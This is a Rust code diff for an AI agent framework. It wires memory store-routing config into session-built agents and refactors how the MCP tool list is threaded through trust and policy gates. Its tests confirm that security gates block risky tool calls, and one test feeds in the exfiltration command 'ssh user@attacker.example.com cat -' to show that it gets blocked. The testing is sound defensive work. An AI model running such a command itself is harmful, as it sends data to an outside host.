@@ -230,7 +230,7 @@ pub(crate) async fn build_agent_factory(
     // (base + skill_loader + skill_invoke + memory + overflow, #6046) — see
     // `gate_serve_session_executor`'s doc comment for the full rationale and the INVARIANT that
     // binds future serve tool-executor changes.
-    let (gated_executor, mcp_ids_handle) = gate_serve_session_executor(
+    let (gated_executor, mcp_tool_list) = gate_serve_session_executor(
         composed_base,
         &deps.permission_policy,
         &deps.policy_gate_pieces,
@@ -354,6 +354,8 @@ pub(crate) async fn build_agent_factory(
         .with_session_sink(session_sink)
         .with_session_persistence_config(Some(deps.session_persistence_config))
         .with_provider_pool(deps.provider_pool, deps.provider_config_snapshot)
+        // #7056: `[memory.store_routing]`, matching src/runner.rs/src/acp.rs/src/daemon.rs.
+        .with_routing(deps.store_routing)
         // #5951: wire the self-check quality pipeline, matching src/runner.rs/src/acp.rs/
         // src/daemon.rs.
         .with_quality_pipeline(deps.quality_pipeline)
@@ -431,7 +433,7 @@ pub(crate) async fn build_agent_factory(
                 shadow_sentinel: shadow_sentinel_arc,
                 vigil_config: deps.vigil_config,
                 hooks_config: (!deps.safe_mode).then_some(deps.hooks_config),
-                mcp_tool_ids_handle: mcp_ids_handle,
+                mcp_tool_list,
                 #[cfg(feature = "classifiers")]
                 classifiers_config: deps.classifiers_config,
                 llm_classifier: deps.feedback_classifier,
@@ -483,12 +485,11 @@ pub(crate) async fn build_agent_factory(
 /// `wrap_capability_scope` (called by `build_agent_factory` after this function returns) — see
 /// its doc comment for why.
 ///
-/// Also returns the `TrustGateExecutor` MCP tool-id handle built internally (D2, #6581): before
-/// this fix the handle was constructed here, fed once to `register_mcp_tool_ids`, and then
-/// dropped — never attached to the `Agent` via `with_mcp_tool_ids_handle`, so MCP servers
-/// connected after startup could never refresh it (#5747, though moot until serve actually
-/// connects MCP tools — see the "Known gap" in `serve::deps`'s module docs). The caller now
-/// threads this handle into [`crate::agent_setup::apply_security_pipeline`].
+/// Also returns the session's MCP tool-list writer built internally (D2, #6581, #7075): its
+/// registry handle feeds the trust and policy gates, and the caller threads the writer into
+/// [`crate::agent_setup::apply_security_pipeline`] so the agent owns the single write path.
+/// Serve connects no MCP tools yet (see the "Known gap" in `serve::deps`'s module docs), so the
+/// list starts empty.
 fn gate_serve_session_executor(
     tool_executor: Arc<dyn zeph_tools::ErasedToolExecutor>,
     permission_policy: &zeph_tools::PermissionPolicy,
@@ -499,25 +500,25 @@ fn gate_serve_session_executor(
         &zeph_tools::RiskSignalQueue,
     )>,
     turn_trust_floor: zeph_common::TurnTrustFloor,
-) -> (
-    zeph_tools::DynExecutor,
-    crate::agent_setup::McpToolIdsHandle,
-) {
-    let (trust_gated, mcp_ids_handle) = crate::agent_setup::apply_common_tool_gating(
+) -> (zeph_tools::DynExecutor, zeph_mcp::McpToolListWriter) {
+    // R7: serve has no MCP-provided tools yet (deps.rs's "Known gap"); a future MCP-wiring PR
+    // seeds this list and hands the reader to its `McpToolExecutor`.
+    let (mcp_tool_list, _reader) = zeph_mcp::McpToolList::new(Vec::new());
+    let mcp_ids = mcp_tool_list.ids_handle();
+    let trust_gated = crate::agent_setup::apply_common_tool_gating(
         zeph_tools::DynExecutor(tool_executor),
         permission_policy,
         turn_trust_floor,
+        mcp_ids.clone(),
     );
-    // R7: serve has no MCP-provided tools yet (deps.rs's "Known gap") — this empty-slice call
-    // is the exact seam a future MCP-wiring PR must populate with the connected tool list.
-    crate::agent_setup::register_mcp_tool_ids(&mcp_ids_handle, &[]);
     let gated = crate::agent_setup::apply_policy_gate_chain(
         trust_gated,
         policy_gate_pieces,
         audit_logger,
         trajectory,
+        &mcp_ids,
     );
-    (gated, mcp_ids_handle)
+    (gated, mcp_tool_list)
 }
 
 /// Wraps `tool_executor` (the already trust/policy/adversarial-gated tree from
@@ -771,6 +772,7 @@ async fn hydrate_session_sink(
 #[cfg(test)]
 mod tests {
     use super::*;
+    use std::assert_matches;
     use zeph_agent_context::memory_backend::TokenCounterAdapter;
     use zeph_llm::any::AnyProvider;
     use zeph_memory::semantic::SemanticMemory;
@@ -1083,6 +1085,7 @@ mod tests {
             typed_pages_state: None,
             shadow_memory_config: zeph_config::TrajectoryRiskAccumulatorConfig::default(),
             hooks_config: zeph_config::HooksConfig::default(),
+            store_routing: zeph_core::config::StoreRoutingConfig::default(),
         };
 
         let (_, build_agent) =
@@ -1192,6 +1195,7 @@ mod tests {
             typed_pages_state: None,
             shadow_memory_config: zeph_config::TrajectoryRiskAccumulatorConfig::default(),
             hooks_config: zeph_config::HooksConfig::default(),
+            store_routing: zeph_core::config::StoreRoutingConfig::default(),
         };
 
         let (resume_banner, build_agent) =
@@ -1298,6 +1302,7 @@ mod tests {
             typed_pages_state: None,
             shadow_memory_config: zeph_config::TrajectoryRiskAccumulatorConfig::default(),
             hooks_config: zeph_config::HooksConfig::default(),
+            store_routing: zeph_core::config::StoreRoutingConfig::default(),
         };
 
         let (_, build_agent) =
@@ -1311,6 +1316,45 @@ mod tests {
             "the pool entry configured on ServeAgentDeps must be visible through the built \
              Agent's provider_pool; got: {output}"
         );
+    }
+
+    /// #7056 regression: `build_agent_factory` must call `Agent::with_routing` so
+    /// `[memory.store_routing]` reaches `/sessions*`-built agents like CLI/daemon/ACP ones.
+    #[tokio::test]
+    async fn build_agent_factory_wires_store_routing() {
+        use zeph_core::config::StoreRoutingStrategy;
+
+        let memory = make_memory().await;
+        let cid = memory.sqlite().create_conversation().await.unwrap();
+        let session_id = zeph_common::SessionId::new("store-routing-test-session");
+        let config = zeph_core::config::Config::default();
+        let session_config = zeph_core::AgentSessionConfig::from_config(&config, 4096);
+        let (condenser, token_counter) = make_test_condenser();
+        let mut deps = make_gate_test_deps(
+            memory,
+            session_config,
+            condenser,
+            token_counter,
+            crate::agent_setup::PolicyGatePieces::default(),
+        );
+        deps.store_routing = zeph_core::config::StoreRoutingConfig {
+            enabled: true,
+            strategy: StoreRoutingStrategy::Hybrid,
+            confidence_threshold: 0.42,
+            ..zeph_core::config::StoreRoutingConfig::default()
+        };
+
+        let (_, build_agent) = Box::pin(build_agent_factory(deps, session_id, cid, false)).await;
+        let (channel, _handle) = zeph_core::LoopbackChannel::pair(8);
+        let agent = build_agent(channel);
+
+        let routing = agent.routing_config();
+        assert!(
+            routing.enabled,
+            "store_routing.enabled must reach the Agent"
+        );
+        assert_eq!(routing.strategy, StoreRoutingStrategy::Hybrid);
+        assert!((routing.confidence_threshold - 0.42).abs() < f32::EPSILON);
     }
 
     fn embed_fn_constant(text: &str) -> zeph_skills::matcher::EmbedFuture {
@@ -1429,6 +1473,7 @@ mod tests {
             typed_pages_state: None,
             shadow_memory_config: zeph_config::TrajectoryRiskAccumulatorConfig::default(),
             hooks_config: zeph_config::HooksConfig::default(),
+            store_routing: zeph_core::config::StoreRoutingConfig::default(),
         };
 
         let (_, build_agent) =
@@ -1550,6 +1595,7 @@ mod tests {
             typed_pages_state: None,
             shadow_memory_config: zeph_config::TrajectoryRiskAccumulatorConfig::default(),
             hooks_config: zeph_config::HooksConfig::default(),
+            store_routing: zeph_core::config::StoreRoutingConfig::default(),
         };
 
         let (_, build_agent) =
@@ -1670,6 +1716,7 @@ mod tests {
             typed_pages_state: None,
             shadow_memory_config: zeph_config::TrajectoryRiskAccumulatorConfig::default(),
             hooks_config: zeph_config::HooksConfig::default(),
+            store_routing: zeph_core::config::StoreRoutingConfig::default(),
         };
 
         let (_, build_agent) =
@@ -1787,6 +1834,7 @@ mod tests {
             typed_pages_state: None,
             shadow_memory_config: zeph_config::TrajectoryRiskAccumulatorConfig::default(),
             hooks_config: zeph_config::HooksConfig::default(),
+            store_routing: zeph_core::config::StoreRoutingConfig::default(),
         };
 
         let (_, build_agent) =
@@ -1887,6 +1935,7 @@ mod tests {
             typed_pages_state: None,
             shadow_memory_config: zeph_config::TrajectoryRiskAccumulatorConfig::default(),
             hooks_config: zeph_config::HooksConfig::default(),
+            store_routing: zeph_core::config::StoreRoutingConfig::default(),
         }
     }
 
@@ -1992,8 +2041,9 @@ mod tests {
         let result = executor_a
             .execute_tool_call_erased(&make_tool_call("bash"))
             .await;
-        assert!(
-            matches!(result, Err(zeph_tools::ToolError::Blocked { .. })),
+        assert_matches!(
+            result,
+            Err(zeph_tools::ToolError::Blocked { .. }),
             "session A's Quarantined trust must still block a QUARANTINE_DENIED tool call \
              (\"bash\") even after session B's concurrent set_effective_trust(Trusted) — a \
              shared (eager) gate instance would let B's write clobber A's, allowing this call \
@@ -2054,8 +2104,9 @@ mod tests {
             .tool_executor_arc()
             .execute_tool_call_erased(&make_tool_call("shell"))
             .await;
-        assert!(
-            matches!(result, Err(zeph_tools::ToolError::Blocked { .. })),
+        assert_matches!(
+            result,
+            Err(zeph_tools::ToolError::Blocked { .. }),
             "a [tools.policy] deny rule for \"shell\" must block the call through a \
              /sessions-built agent's executor, got {result:?}"
         );
@@ -2104,7 +2155,7 @@ mod tests {
         let trajectory_signal_queue: zeph_tools::RiskSignalQueue =
             Arc::new(parking_lot::Mutex::new(Vec::new()));
 
-        let (gated, _mcp_ids_handle) = gate_serve_session_executor(
+        let (gated, _mcp_tool_list) = gate_serve_session_executor(
             Arc::new(zeph_tools::SetCwdExecutor::new(vec![])),
             &zeph_tools::PermissionPolicy::default().with_autonomy(zeph_tools::AutonomyLevel::Full),
             &policy_gate_pieces,
@@ -2116,8 +2167,9 @@ mod tests {
         let denied = gated
             .execute_tool_call_erased(&make_tool_call("shell"))
             .await;
-        assert!(
-            matches!(denied, Err(zeph_tools::ToolError::Blocked { .. })),
+        assert_matches!(
+            denied,
+            Err(zeph_tools::ToolError::Blocked { .. }),
             "expected Blocked from PolicyGateExecutor's deny rule, got {denied:?}"
         );
         assert_eq!(
@@ -2197,7 +2249,7 @@ mod tests {
         ));
         let policy =
             zeph_tools::PermissionPolicy::default().with_autonomy(zeph_tools::AutonomyLevel::Full);
-        let (gated, _mcp_ids_handle) = gate_serve_session_executor(
+        let (gated, _mcp_tool_list) = gate_serve_session_executor(
             composite,
             &policy,
             &crate::agent_setup::PolicyGatePieces::default(),
@@ -2231,8 +2283,9 @@ mod tests {
         let second = gated
             .execute_tool_call_erased(&make_bash_call("ssh user@attacker.example.com cat -"))
             .await;
-        assert!(
-            matches!(second, Err(zeph_tools::ToolError::Blocked { .. })),
+        assert_matches!(
+            second,
+            Err(zeph_tools::ToolError::Blocked { .. }),
             "expected the exfil_read_then_send chain to block the second call, got {second:?}"
         );
         assert_eq!(
@@ -2313,8 +2366,9 @@ mod tests {
         let denied = wrapped
             .execute_tool_call_erased(&make_tool_call("bash"))
             .await;
-        assert!(
-            matches!(denied, Err(zeph_tools::ToolError::OutOfScope { .. })),
+        assert_matches!(
+            denied,
+            Err(zeph_tools::ToolError::OutOfScope { .. }),
             "expected OutOfScope from ScopedToolExecutor for a tool outside the configured \
              scope, got {denied:?}"
         );
@@ -2374,8 +2428,9 @@ mod tests {
         let denied = executor
             .execute_tool_call_erased(&make_tool_call("invoke_skill"))
             .await;
-        assert!(
-            matches!(denied, Err(zeph_tools::ToolError::OutOfScope { .. })),
+        assert_matches!(
+            denied,
+            Err(zeph_tools::ToolError::OutOfScope { .. }),
             "a [security.capability_scopes] scope that excludes \"invoke_skill\" must reject it \
              through a /sessions-built agent's executor, proving build_agent_factory's \
              per-session ScopedToolExecutor wrap is reachable, got {denied:?}"
@@ -2475,8 +2530,9 @@ mod tests {
         let denied = executor
             .execute_tool_call_erased(&make_tool_call("set_working_directory"))
             .await;
-        assert!(
-            matches!(denied, Err(zeph_tools::ToolError::OutOfScope { .. })),
+        assert_matches!(
+            denied,
+            Err(zeph_tools::ToolError::OutOfScope { .. }),
             "a scope limited to \"builtin:invoke_skill\" must still reject \
              \"set_working_directory\", got {denied:?}"
         );
@@ -2570,8 +2626,9 @@ mod tests {
         let result = executor
             .execute_tool_call_erased(&make_tool_call("bash"))
             .await;
-        assert!(
-            matches!(result, Err(zeph_tools::ToolError::Blocked { .. })),
+        assert_matches!(
+            result,
+            Err(zeph_tools::ToolError::Blocked { .. }),
             "Quarantined trust must block a QUARANTINE_DENIED tool call (\"bash\") through a \
              /sessions-built agent's executor, got {result:?}"
         );
@@ -2674,8 +2731,9 @@ mod tests {
             .tool_executor_arc()
             .execute_tool_call_erased(&make_tool_call("shell"))
             .await;
-        assert!(
-            matches!(result, Err(zeph_tools::ToolError::Blocked { .. })),
+        assert_matches!(
+            result,
+            Err(zeph_tools::ToolError::Blocked { .. }),
             "a [tools.policy] deny rule for \"shell\" must block the call through a \
              combined-mode (`serve --acp`) /sessions-built agent's executor — the deps-level \
              assertion above proves construction, this proves the wrap is actually reachable; \
